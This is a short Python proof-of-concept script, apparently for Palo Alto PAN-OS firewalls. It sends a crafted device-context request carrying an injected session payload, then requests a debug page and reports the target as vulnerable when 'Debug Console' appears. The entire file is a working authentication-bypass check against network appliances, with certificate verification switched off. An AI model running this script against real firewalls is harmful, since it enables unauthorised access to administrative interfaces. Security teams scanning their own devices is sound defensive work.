import requests
import sys

if len(sys.argv) > 1:
    target = sys.argv[1]

    create_session_url = 'https://{}/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'.format(
        target)
    verify_url = 'https://{}/php/utils/debug.php'.format(target)

    session = requests.Session()
    session.get(verify_url, verify=False)
    session.get(create_session_url, verify=False)
    verify = session.get(verify_url, verify=False)

    if 'Debug Console' in verify.text:
        print('https://{} is vul'.format(target))
else:
    print('Usage: python panos-poc.py panip')